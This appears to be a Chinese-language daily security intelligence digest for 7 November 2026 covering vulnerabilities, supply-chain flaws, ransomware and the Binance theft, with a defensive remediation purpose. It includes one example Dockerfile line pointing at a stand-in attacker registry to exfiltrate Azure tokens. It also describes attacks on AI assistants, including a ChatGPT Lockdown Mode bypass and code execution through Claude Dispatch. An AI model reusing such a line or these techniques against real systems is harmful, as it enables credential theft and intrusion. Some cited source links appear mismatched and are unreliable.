@@ -1,0 +1,207 @@
+---
+layout: post
+title: "安全情报日报 2026-11-07"
+date: 2026-11-07
+events: 10
+headline: "Chainalysis 称币安 6.4B 被盗案源于朝鲜假面试"
+dek: "币安案是当日主线：Chainalysis 指朝鲜假面试为入口，同类剧本 18 个月致 $14.3 million 损失，攻击者 October 20 才拿到钱包运营访问。WordPress <i class=\"hl kcve\">CVE-2026-119977</i> 升级窗口被在野打，单日拦 12,632 次尝试。kaniko 令牌外发与 Kyverno 提权把收权清单再拉长两行。"
+brief_stats: ["10 事件", "在野 1", "PoC 1", "6 类别", "顶分 88"]
+---
+
+<nav class="toc" id="toc" aria-label="目录">
+<h2>目录 <span>Contents</span></h2>
+<p class="legend">利用状态：<b class="xw">在野</b> 已确认/KEV · <b class="xp">PoC</b> 公开利用代码 · <b class="xn">未公开</b> 暂无情报<br>优先级：<b class="rp0">P0</b> ≥85 · <b class="rp1">P1</b> 75–84 · <b class="rp2">P2</b> ≤74</p>
+<div class="toc-scroll">
+<div class="grp"><p class="tg-h"><a href="#sec-vuln">漏洞与在野利用</a><span class="tg-c">4</span></p><ol>
+<li><a class="toc-link" href="#vuln-98049"><span class="tc">·</span><span class="tt">WordPress 升级竞态仍留 RCE 窗口</span><span class="meta"><i class="rp p0">P0</i><i class="xs xw">在野利用·KEV</i></span></a></li>
+<li><a class="toc-link" href="#vuln-46670"><span class="tc">·</span><span class="tt">ChatGPT 限制模式被绕过可静默窃取对话</span><span class="meta"><i class="rp p2">P2</i><i class="xs xn">未公开利用</i></span></a></li>
+<li><a class="toc-link" href="#vuln-48815"><span class="tc">·</span><span class="tt">Kyverno 跨命名空间提权入 NVD 评 9.9</span><span class="meta"><i class="rp p2">P2</i><i class="xs xn">未公开利用</i></span></a></li>
+<li><a class="toc-link" href="#vuln-78387"><span class="tc">·</span><span class="tt">Windows Paint 只走商店更新才修 RCE</span><span class="meta"><i class="rp p2">P2</i><i class="xs xn">未公开利用</i></span></a></li>
+</ol></div>
+<div class="grp"><p class="tg-h"><a href="#sec-supplychain">供应链 / CI-CD</a><span class="tg-c">1</span></p><ol>
+<li><a class="toc-link" href="#supplychain-18131"><span class="tc">·</span><span class="tt">kaniko 会把 Azure 构建令牌发给仿冒镜像域</span><span class="meta"><i class="rp p1">P1</i></span></a></li>
+</ol></div>
+<div class="grp"><p class="tg-h"><a href="#sec-ransomware">勒索软件与数据泄露</a><span class="tg-c">1</span></p><ol>
+<li><a class="toc-link" href="#ransomware-52704"><span class="tc">·</span><span class="tt">勒索团伙 n0n 近 7 天仍新增 36 名受害者</span><span class="meta"><i class="rp p2">P2</i></span></a></li>
+</ol></div>
+<div class="grp"><p class="tg-h"><a href="#sec-ttp">攻击战术与技术</a><span class="tg-c">1</span></p><ol>
+<li><a class="toc-link" href="#ttp-73884"><span class="tc">·</span><span class="tt">恶意浏览器扩展借 Claude Dispatch 在桌面执行代码</span><span class="meta"><i class="rp p2">P2</i></span></a></li>
+</ol></div>
+<div class="grp"><p class="tg-h"><a href="#sec-incident">重大安全事件</a><span class="tg-c">2</span></p><ol>
+<li><a class="toc-link" href="#incident-17636"><span class="tc">★</span><span class="tt">Chainalysis 追踪币安被盗案资金链</span><span class="meta"><i class="rp p0">P0</i></span></a></li>
+<li><a class="toc-link" href="#incident-02894"><span class="tc">·</span><span class="tt">SEAL 称币安遭入侵窗口长达 8 周</span><span class="meta"><i class="rp p1">P1</i></span></a></li>
+</ol></div>
+<div class="grp"><p class="tg-h"><a href="#sec-crypto-infra">区块链基础设施</a><span class="tg-c">1</span></p><ol>
+<li><a class="toc-link" href="#crypto-infra-36417"><span class="tc">·</span><span class="tt">Trail of Bits 提醒排查签名系统授权面</span><span class="meta"><i class="rp p2">P2</i></span></a></li>
+</ol></div>
+</div></nav>
+
+<div class="feed-col">
+<div class="alert">⚠ 覆盖不足披露：部分来源本次采集失败，内容可能不完整。</div>
+
+<p class="section-label" id="sec-vuln"><span class="n">01</span>漏洞与在野利用</p>
+
+<div class="intel reveal" id="vuln-98049">
+<div class="intel-head"><span class="chip">漏洞与在野利用</span><i class="xs xw">在野利用·KEV</i><span class="score">处置 <i class="rp p0">P0</i> · CONF high<i>85</i></span></div>
+<div class="intel-body">
+<h3>WordPress 升级竞态仍留 RCE 窗口</h3>
+<p class="sum">跟进 2026-11-05 报道（<i class="hl kcve">CVE-2026-119977</i> 入 <i class="hl">CISA</i> KEV），Xint 与 NVD 补齐细节：<i class="hl">WordPress Core</i> 4.7 through 7.1.3 存在 TOCTOU 竞态，原因是 &quot;predictable, web-accessible staging paths used during full-package core upgrades&quot;，未认证攻击者可在升级窗口内执行代码；旧版更新器在未打补丁站点上仍会解包 7.1.4 的修复内容，窗口依旧存在。<i class="hl">Wordfence</i> 在公开披露后 21 小时内记录 &quot;more than 18,500 requests targeting staged &quot;setup-config.php&quot; installer paths&quot;，近 24 小时又拦截 12,632 次利用尝试；Previdian 蜜网 2026 年 10 月 30 日观测到来自英国 IP 的 3 次利用尝试。CISA 要求 FCEB 机构于 November 6, 2026 前完成修复。</p>
+<div class="intel-facts"><b class="fct fcve">CVE-2026-119977</b><b class="fct fcvss">CVSS 8.1</b><b class="fct fout">2 源报道</b><div class="fvers"><span class="fv"><b>受影响</b> WordPress Core 4.7 through 7.1.3</span><span class="fv"><b>修复</b> 7.1.4</span></div></div>
+<div class="intel-grid">
+<div class="cell"><b>Impact</b><p>暴露人群为全部未升级 WordPress Core 4.7-7.1.3 站点；升级窗口本身即攻击面，Wordfence 侧已观测到大规模在野扫描与利用尝试。</p></div>
+<div class="cell"><b>Action</b><p>升级至 WordPress 7.1.4（NVD/厂商口径），并将升级动作视为敏感变更窗口：升级期间收紧对 staging 路径（如 setup-config.php）的公网访问、升级后立即核查站点文件完整性；美国联邦机构修复期限 November 6, 2026 已过，未达标者按 BOD 26-04 上报。</p></div>
+</div>
+<div class="iocblk"><div class="iocblk-h"><span>INDICATORS · 本条指标 <em>(1)</em></span><button class="iocblk-c" data-copy="vuln-98049-ioc">复制</button></div><pre id="vuln-98049-ioc">https://www.cyberkendra.com/2026/11/cve-2026-119977-wordpress-core-update-race-rce.html</pre></div>
+</div>
+<div class="intel-foot"><span>2026-11-07 · SID ANALYSIS</span><a href="https://www.cyberkendra.com/2026/11/cve-2026-119977-wordpress-core-update-race-rce.html" target="_blank" rel="noopener">SOURCE ↗</a><a href="https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-119977" target="_blank" rel="noopener" class="deepchip">官方 ↗</a><a href="https://www.cisa.gov/news-events/alerts/2026/11/03/cisa-adds-one-known-exploited-vulnerability-catalog" target="_blank" rel="noopener" class="deepchip">官方 ↗</a><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog?selected_cve=CVE-2026-119977" target="_blank" rel="noopener" class="deepchip">交叉 ↗</a></div>
+</div>
+
+<div class="intel reveal" id="vuln-46670">
+<div class="intel-head"><span class="chip">漏洞与在野利用</span><i class="xs xn">未公开利用</i><span class="score">处置 <i class="rp p2">P2</i> · CONF medium<i>72</i></span></div>
+<div class="intel-body">
+<h3>ChatGPT 限制模式被绕过可静默窃取对话</h3>
+<p class="sum">安全研究人员披露一个现已修复的漏洞，可绕过 OpenAI ChatGPT 的 <i class="hl">Lockdown Mode</i> 防护；Lockdown Mode 于 June 2026 推出，用于降低 prompt injection 导致的数据外泄风险。研究称该缺陷可实现静默对话数据窃取与钓鱼。</p>
+
+<div class="intel-grid">
+<div class="cell"><b>Impact</b><p>暴露人群：启用 Lockdown Mode 的企业与个人 <i class="hl">ChatGPT</i> 用户——原本作为最后防线的设置被证明可绕过。确认后果：对话数据可无用户交互外泄。</p></div>
+<div class="cell"><b>Action</b><p>确认 OpenAI 已推送的修复生效；对含敏感数据的会话降低第三方内容注入面（不打开不可信链接/文件）；关注 OpenAI 公告。</p></div>
+</div>
+
+</div>
+<div class="intel-foot"><span>2026-11-07 · SID ANALYSIS</span><a href="https://thehackernews.com/2026/11/researchers-bypass-chatgpt-lockdown.html" target="_blank" rel="noopener">SOURCE ↗</a></div>
+</div>
+
+<div class="intel reveal" id="vuln-48815">
+<div class="intel-head"><span class="chip">漏洞与在野利用</span><i class="xs xn">未公开利用</i><span class="score">处置 <i class="rp p2">P2</i> · CONF high<i>72</i></span></div>
+<div class="intel-body">
+<h3>Kyverno 跨命名空间提权入 NVD 评 9.9</h3>
+<p class="sum">NVD 新收录 <i class="hl kcve">CVE-2026-122313</i>（评分 9.9，published 2026-11-05）：<i class="hl">Kyverno</i> 1.17.0 至 1.19.2 之前的版本存在提权缺陷，NamespacedMutatingPolicy 的 targetMatchConstraints.expression CEL 输出缺少命名空间校验，命名空间级租户可改写其他命名空间的资源，例如指向另一租户的 <i class="hl">RoleBinding</i>，由集群级 background controller 代为变更。</p>
+<div class="intel-facts"><b class="fct fcve">CVE-2026-122313</b><b class="fct fcvss">CVSS 9.9</b><div class="fvers"><span class="fv"><b>受影响</b> Kyverno from 1.17.0 before 1.19.2</span><span class="fv"><b>修复</b> 1.19.2</span></div></div>
+<div class="intel-grid">
+<div class="cell"><b>Impact</b><p>暴露人群：多租户 Kubernetes 集群中使用 Kyverno NamespacedMutatingPolicy 的平台方。确认后果：租户可借策略输出越权修改他租户 RoleBinding，形成横向提权路径。</p></div>
+<div class="cell"><b>Action</b><p>升级 Kyverno 至 1.19.2；临时收紧 NamespacedMutatingPolicy 的 CEL 输出校验与 background controller 权限；审计现有 RoleBinding 变更。</p></div>
+</div>
+
+</div>
+<div class="intel-foot"><span>2026-11-07 · SID ANALYSIS</span><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-122313" target="_blank" rel="noopener">SOURCE ↗</a></div>
+</div>
+
+<div class="intel reveal" id="vuln-78387">
+<div class="intel-head"><span class="chip">漏洞与在野利用</span><i class="xs xn">未公开利用</i><span class="score">处置 <i class="rp p2">P2</i> · CONF high<i>70</i></span></div>
+<div class="intel-body">
+<h3>Windows Paint 只走商店更新才修 RCE</h3>
+<p class="sum">微软修复 <i class="hl kcve">CVE-2026-83844</i>（<i class="hl">Windows Paint</i> 远程代码执行缺陷，越界读取，可让攻击者跨网络执行代码），但修复仅通过 <i class="hl">Microsoft Store</i> 分发，Windows Update 不会推送；修复构建版本 11.2609.401.0，为 The Hacker News 在十个国家检查到的最新 Paint 构建。</p>
+<div class="intel-facts"><b class="fct fcve">CVE-2026-83844</b><div class="fvers"><span class="fv"><b>受影响</b> Windows Paint</span><span class="fv"><b>修复</b> 11.2609.401.0</span></div></div>
+<div class="intel-grid">
+<div class="cell"><b>Impact</b><p>暴露人群：依赖 Windows Update 自动打补丁、未管理商店应用更新的终端与运维团队。确认后果：桌面画图软件成为网络侧代码执行入口，且常规补丁渠道覆盖不到。</p></div>
+<div class="cell"><b>Action</b><p>把 Microsoft Store 应用（含 Paint）纳入更新管理基线，确认构建 11.2609.401.0；企业环境检查 Store 更新策略是否被禁用。</p></div>
+</div>
+
+</div>
+<div class="intel-foot"><span>2026-11-07 · SID ANALYSIS</span><a href="https://thehackernews.com/2026/11/microsoft-paint-rce-fix-now-available.html" target="_blank" rel="noopener">SOURCE ↗</a></div>
+</div>
+
+<p class="section-label" id="sec-supplychain"><span class="n">02</span>供应链 / CI-CD</p>
+
+<div class="intel reveal" id="supplychain-18131">
+<div class="intel-head"><span class="chip">供应链 / CI-CD</span><span class="score">处置 <i class="rp p1">P1</i> · CONF high<i>80</i></span></div>
+<div class="intel-body">
+<h3>kaniko 会把 Azure 构建令牌发给仿冒镜像域</h3>
+<p class="sum">GHSA/NVD 披露 <i class="hl kcve">CVE-2026-105769</i>（critical，CVSS 9.3）：chainguard-dev <i class="hl">kaniko</i> v1.25.20 之前依赖的 ACR 凭据助手 github.com/chrismellard/docker-credential-acr-env 用 &quot;unanchored regular expression&quot; 判定 ACR 域名——主机名只要包含 .azurecr.io、.azurecr.cn、.azurecr.de 或 .azurecr.us 即被接受。Dockerfile 引用仿冒主机（如 FROM x.azurecr.io.attacker.com/img 或 COPY --from）且该 registry 无凭据时，kaniko 会用构建身份的 Entra ID 令牌向 https://&lt;host&gt;/oauth2/exchange 发起 POST，把 Azure Resource Manager 作用域令牌送给攻击者；令牌在过期前可直接使用，还能兑换身份可访问的任意 ACR 凭据。无需 RUN 指令或 push。修复版本 1.25.20（chainguard-forks PR #495）。</p>
+<div class="intel-facts"><b class="fct fcve">CVE-2026-105769</b><b class="fct fcvss">CVSS 9.3</b><div class="fvers"><span class="fv"><b>受影响</b> github.com/chainguard-dev/kaniko before v1.25.20</span><span class="fv"><b>修复</b> 1.25.20</span></div></div>
+<div class="intel-grid">
+<div class="cell"><b>Impact</b><p>暴露人群：用 kaniko 构建镜像、构建身份挂有 Azure 角色指派的 CI/CD 流水线。确认后果：一条 Dockerfile 里的仿冒 FROM 引用即可外发 ARM 作用域访问令牌，等同云凭据泄露；供应链注入与后续 ACR 拉取凭据均可被利用。</p></div>
+<div class="cell"><b>Action</b><p>升级 <i class="hl">kaniko</i> 至 1.25.20；构建前静态检查 Dockerfile 中 registry 主机名与 .azurecr.io 变体；最小化构建身份（service principal/federated workload identity/managed identity）的 Azure 角色范围，并监控 /oauth2/exchange 异常出站。</p></div>
+</div>
+
+</div>
+<div class="intel-foot"><span>2026-11-07 · SID ANALYSIS</span><a href="https://github.com/advisories/GHSA-5q7h-w9jf-cx97" target="_blank" rel="noopener">SOURCE ↗</a><a href="https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-105769" target="_blank" rel="noopener" class="deepchip">官方 ↗</a><a href="https://thehackernews.com/2026/11/attackers-pose-as-it-support-on.html" target="_blank" rel="noopener" class="deepchip">报道 ↗</a><a href="https://thehackernews.com/2026/11/microsoft-paint-rce-fix-now-available.html" target="_blank" rel="noopener" class="deepchip">报道 ↗</a></div>
+</div>
+
+<p class="section-label" id="sec-ransomware"><span class="n">03</span>勒索软件与数据泄露</p>
+
+<div class="intel reveal" id="ransomware-52704">
+<div class="intel-head"><span class="chip">勒索软件与数据泄露</span><span class="score">处置 <i class="rp p2">P2</i> · CONF medium<i>60</i></span></div>
+<div class="intel-body">
+<h3>勒索团伙 n0n 近 7 天仍新增 36 名受害者</h3>
+<p class="sum">跟进 2026-10-26 报道（当时 7 天 46 家）：<i class="hl">n0n</i> 泄密站近 7 天发布 36 条帖子、涉及受害者 36 家，较上次口径回落，最新发现时间 2026-11-06；受害者样例含 Centrepoint、Chartboost LLC、Cogent Biosciences, Inc.。</p>
+<div class="intel-facts"><b class="fct factor">n0n</b></div>
+<div class="intel-grid">
+<div class="cell"><b>Impact</b><p>暴露人群：被 n0n 盯上的中小企业与医疗/科技类机构（样例含 Cogent Biosciences）。确认后果：双重勒索泄密站持续公布受害者。</p></div>
+<div class="cell"><b>Action</b><p>对照受害者名单行业与自身供应链排查暴露；备份与外联日志按勒索事件标准复核。</p></div>
+</div>
+
+</div>
+<div class="intel-foot"><span>2026-11-07 · SID ANALYSIS</span><a href="https://www.ransomlook.io/group/n0n" target="_blank" rel="noopener">SOURCE ↗</a></div>
+</div>
+
+<p class="section-label" id="sec-ttp"><span class="n">04</span>攻击战术与技术</p>
+
+<div class="intel reveal" id="ttp-73884">
+<div class="intel-head"><span class="chip">攻击战术与技术</span><span class="score">处置 <i class="rp p2">P2</i> · CONF medium<i>66</i></span></div>
+<div class="intel-body">
+<h3>恶意浏览器扩展借 Claude Dispatch 在桌面执行代码</h3>
+<p class="sum"><i class="hl">Forever Security</i> 研究员演示：能在 claude.ai 页面运行脚本的恶意浏览器扩展，可借 Claude Desktop 的 <i class="hl">Dispatch</i> 功能（手机向桌面下发任务）让 Claude Desktop 在用户电脑上执行代码；该缺陷目前仍可被利用（尚未修复）。</p>
+
+<div class="intel-grid">
+<div class="cell"><b>Impact</b><p>暴露人群：安装未审查浏览器扩展、且启用 Claude Dispatch 连接手机与桌面端的使用者。确认后果：浏览器扩展脚本可升级为本机代码执行。</p></div>
+<div class="cell"><b>Action</b><p>限制浏览器扩展安装来源、审查可注入 claude.ai 的扩展；暂不启用或收紧 Dispatch 手机下发任务链路；跟踪 Forever Security 与 Anthropic 后续披露。</p></div>
+</div>
+
+</div>
+<div class="intel-foot"><span>2026-11-07 · SID ANALYSIS</span><a href="https://thehackernews.com/2026/11/malicious-browser-extensions-could-use.html" target="_blank" rel="noopener">SOURCE ↗</a></div>
+</div>
+
+<p class="section-label" id="sec-incident"><span class="n">05</span>重大安全事件</p>
+
+<div class="intel focus reveal" id="incident-17636">
+<div class="intel-head"><span class="chip">今日焦点</span><span class="score">处置 <i class="rp p0">P0</i> · CONF high<i>88</i></span></div>
+<div class="intel-body">
+<h3>Chainalysis 追踪币安被盗案资金链</h3>
+<p class="sum"><i class="hl">Chainalysis</i> 发布币安案调查（11 月 4 日亚洲时报刊发原文）：10 月 29 日约 4:20 p.m. ET 起资金流出 <i class="hl">Binance</i> hot wallets，涉案 US$6.4 billion。攻击入口是朝鲜（DPRK）雇佣欺诈剧本——9 月一名 Binance 工程师收到假面试邀请，经与虚构公司 &quot;two rounds of interviews&quot; 后下载含恶意代码的 interview assignment 失陷，攻击者随后 &quot;deployed malware and exploited access to an internal AI tool&quot; 深入内网。Chainalysis 过去 18 个月已把 &quot;more than $14.3 million&quot; 损失归因于同类假面试/恶意载荷投毒手法，称此前的小规模得手是在 &quot;perfecting and evolving their methodology&quot;，最终酿成 &quot;the biggest heist in history&quot;。Elliptic 11 月 6 日统计 $3.1B 被盗资产尚未清洗。</p>
+<div class="intel-facts"><b class="fct factor">TraderTraitor</b><b class="fct fout">6 源报道</b></div>
+<div class="intel-grid">
+<div class="cell"><b>Impact</b><p>暴露人群为依赖热钱包的交易所与托管机构：私钥未泄露、仅凭员工终端+内部工具信任链即被盗跨链资金。已确认后果：约 $6.4 Billion 外流、同类朝鲜剧本累计另致 $14.3 million 以上损失；<i class="hl">Elliptic</i> 称大头 ETH/比特币尚未清洗，仍存在冻结窗口。</p></div>
+<div class="cell"><b>Action</b><p>把招聘/面试环节当攻击面：禁止在个人终端运行来路不明的 &quot;interview assignment&quot;、对视频会议与作业文件做沙箱化处理；审计内部 AI 工具的越权调用路径；对照 Chainalysis 地址簇开展链上冻结协作，跟踪 $3.1B 未清洗资金的动向外溢。</p></div>
+</div>
+<div class="iocblk"><div class="iocblk-h"><span>INDICATORS · 本条指标 <em>(3)</em></span><button class="iocblk-c" data-copy="incident-17636-ioc">复制</button></div><pre id="incident-17636-ioc">https://www.chainalysis.com/blog/binance-exploit-latest-findings-and-response/
+https://asiatimes.com/2026/11/north-korean-hackers-perfected-a-playbook-for-the-binance-heist/
+https://decrypt.co/382711/3-1b-in-stolen-binance-crypto-has-yet-to-be-laundered-elliptic</pre></div>
+</div>
+<div class="intel-foot"><span>2026-11-07 · SID ANALYSIS</span><a href="https://www.chainalysis.com/blog/binance-exploit-latest-findings-and-response/" target="_blank" rel="noopener">SOURCE ↗</a><a href="https://decrypt.co/382599/binance-cuts-off-signalplus-api-keys-over-potential-security-issue-at-trading-platform" target="_blank" rel="noopener" class="deepchip">报道 ↗</a><a href="https://www.chainalysis.com/blog/binance-hack-dprk-employment-fraud/" target="_blank" rel="noopener" class="deepchip">交叉 ↗</a><a href="https://research.checkpoint.com/2026/2nd-november-threat-intelligence-report/" target="_blank" rel="noopener" class="deepchip">交叉 ↗</a></div>
+</div>
+
+<div class="intel reveal" id="incident-02894">
+<div class="intel-head"><span class="chip">重大安全事件</span><span class="score">处置 <i class="rp p1">P1</i> · CONF high<i>76</i></span></div>
+<div class="intel-body">
+<h3>SEAL 称币安遭入侵窗口长达 8 周</h3>
+<p class="sum"><i class="hl">SEAL</i> 复盘与币安口径经 Cointelegraph 对质后修正：<i class="hl">Security Alliance</i> 估计朝鲜关联黑客在 10 月 29 日 $6.3 billion 盗币前约八周已控制一名币安工程师设备（9 月假招聘得手），但币安发言人澄清整体攻击始于 June——6 月另一名员工安装 AI 编码工具时下载到被篡改的 Homebrew 安装介质即已失陷，设备虽更换并轮换凭据，攻击者已掌握钱包基础设施人员信息；直到 October 20 攻击者才借被控设备与内部 AI 工具横向拿下两名钱包基础设施工程师的设备并取得 deployment permission token。SEAL 点名 <i class="hl">TraderTraitor</i> 2026 年至少四个假招聘壳公司 citalab.net、citalab.com、bitfit.io、oddium.io，并给出同类潜伏周期：Bitget hack 约六周（$388 million）、Kelp DAO 漏洞前 LayerZero 约六周（$293 million）、AFX 约三周（$24 million）。FBI 周六报告归因 TraderTraitor。</p>
+<div class="intel-facts"><b class="fct factor">TraderTraitor</b><b class="fct fout">6 源报道</b></div>
+<div class="intel-grid">
+<div class="cell"><b>Impact</b><p>暴露人群为拥有钱包运营/签名基础设施的交易所与托管方：被盗不需要私钥，长周期潜伏+内部工具信任链即可完成。确认后果：币安 10 月 29 日热钱包被跨链抽干约 $6.3B，同类模式已在 Bitget、Kelp DAO、AFX 等案复现。</p></div>
+<div class="cell"><b>Action</b><p>以&quot;周级潜伏&quot;为假设复核：重点排查招聘/开源渠道引入的初始落点（如被篡改的 Homebrew 安装脚本）、比对 October 20 式横向移动痕迹（新出现的凭据使用与 deployment token 签发）；将 SEAL 点名的壳公司域名加入威胁情报阻断清单；跟进 FBI 与 SEAL 报告更新。</p></div>
+</div>
+<div class="iocblk"><div class="iocblk-h"><span>INDICATORS · 本条指标 <em>(2)</em></span><button class="iocblk-c" data-copy="incident-02894-ioc">复制</button></div><pre id="incident-02894-ioc">https://cointelegraph.com/news/binance-hackers-8-weeks-access-63b-exploit-security-alliance?utm_source=rss_feed&utm_medium=rss&utm_campaign=rss_part
+https://cointelegraph.com/news/binance-hackers-8-weeks-access-63b-exploit-security-alliance</pre></div>
+</div>
+<div class="intel-foot"><span>2026-11-07 · SID ANALYSIS</span><a href="https://cointelegraph.com/news/binance-hackers-8-weeks-access-63b-exploit-security-alliance?utm_source=rss_feed&utm_medium=rss&utm_campaign=rss_partner_inbound" target="_blank" rel="noopener">SOURCE ↗</a><a href="https://wordpress.org/news/2026/09/owa-president/" target="_blank" rel="noopener" class="deepchip">报道 ↗</a><a href="https://wordpress.org/news/2026/09/owa-president/" target="_blank" rel="noopener" class="deepchip">交叉 ↗</a><a href="https://cryptobriefing.com/binance-hackers-eight-weeks-access-theft/" target="_blank" rel="noopener" class="deepchip">深度 ↗</a></div>
+</div>
+
+<p class="section-label" id="sec-crypto-infra"><span class="n">06</span>区块链基础设施</p>
+
+<div class="intel reveal" id="crypto-infra-36417">
+<div class="intel-head"><span class="chip">区块链基础设施</span><span class="score">处置 <i class="rp p2">P2</i> · CONF high<i>68</i></span></div>
+<div class="intel-body">
+<h3>Trail of Bits 提醒排查签名系统授权面</h3>
+<p class="sum"><i class="hl">Trail of Bits</i> 以币安 2026 年 10 月事件为引发布署名系统风险清单：只监控转账与所有权变更的组织，可能要到资产移动才发现钱包授权被改。文中复述 Binance 首份通报（失陷 DevOps 笔记本接入 service container 提交未授权提币）与 11 月 3 日报告（涉及社工、内部 AI 工具滥用、凭据窃取及未授权访问钱包签名）。</p>
+
+<div class="intel-grid">
+<div class="cell"><b>Impact</b><p>暴露人群：持有用户资金、依赖签名/授权系统的交易所与托管机构。确认后果：有效签名可能直接授予攻击者钱包权限，常规监控存在盲区。</p></div>
+<div class="cell"><b>Action</b><p>盘点签名系统可批准的权限类型，把&quot;钱包授权变更&quot;纳入独立告警；核查 DevOps 终端与内部 AI 工具的信任边界；对照文中清单逐项自查。</p></div>
+</div>
+<div class="iocblk"><div class="iocblk-h"><span>INDICATORS · 本条指标 <em>(1)</em></span><button class="iocblk-c" data-copy="crypto-infra-36417-ioc">复制</button></div><pre id="crypto-infra-36417-ioc">https://blog.trailofbits.com/2026/11/06/after-binance-check-what-your-signing-systems-can-approve/</pre></div>
+</div>
+<div class="intel-foot"><span>2026-11-07 · SID ANALYSIS</span><a href="https://blog.trailofbits.com/2026/11/06/after-binance-check-what-your-signing-systems-can-approve/" target="_blank" rel="noopener">SOURCE ↗</a></div>
+</div>
+
+</div>
